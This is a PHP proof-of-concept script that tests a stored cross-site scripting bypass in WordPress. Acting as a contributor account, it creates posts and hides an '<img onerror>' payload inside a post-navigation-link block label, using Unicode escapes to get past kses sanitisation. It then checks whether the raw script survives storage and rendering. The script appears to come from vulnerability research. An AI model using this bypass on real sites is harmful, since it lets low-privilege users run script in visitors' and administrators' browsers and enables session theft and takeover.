<?php
function out($k,$v){ echo $k.': '.$v."\n"; }
$contrib = get_user_by('login','contributor');
wp_set_current_user($contrib->ID);
kses_remove_filters(); kses_init_filters();

$author=$contrib->ID; $ids=array();
foreach (array('2020-01-01','2020-02-01','2020-03-01') as $i=>$d){
  $ids[]=wp_insert_post(array('post_title'=>"navtest$i",'post_status'=>'publish','post_type'=>'post','post_author'=>$author,'post_date'=>"$d 10:00:00",'post_content'=>'body'));
}
$mid=$ids[1];

// Unicode-escaped JSON: NO literal < inside the comment. kses sees plain text.
$raw = '<!-- wp:post-navigation-link {"type":"next","label":"\u003cimg src=x onerror=alert(document.domain)\u003e"} /-->';
wp_update_post(wp_slash(array('ID'=>$mid,'post_content'=>$raw)));
$stored=get_post($mid)->post_content;
out('STORED', $stored);
out('comment_intact', (strpos($stored,'<!-- wp:post-navigation-link')===0)?'YES':'no');
out('u003c_survived', strpos($stored,'<img src=x onerror=alert')!==false ? 'YES' : 'no');

// Confirm parse_blocks decodes it back to raw <img>.
$blocks = parse_blocks($stored);
out('parsed_label', isset($blocks[0]['attrs']['label']) ? $blocks[0]['attrs']['label'] : '(none)');

// Render in singular context.
query_posts(array('p'=>$mid,'post_type'=>'post'));
if(have_posts()){ the_post(); }
$rendered = apply_filters('the_content', get_post($mid)->post_content);
out('RENDERED', trim($rendered));
out('RAW_XSS_IN_OUTPUT', strpos($rendered,'<img src=x onerror=alert(document.domain)>')!==false ? '*** YES STORED XSS ***' : 'no');
wp_reset_query();
foreach($ids as $d) wp_delete_post($d,true);
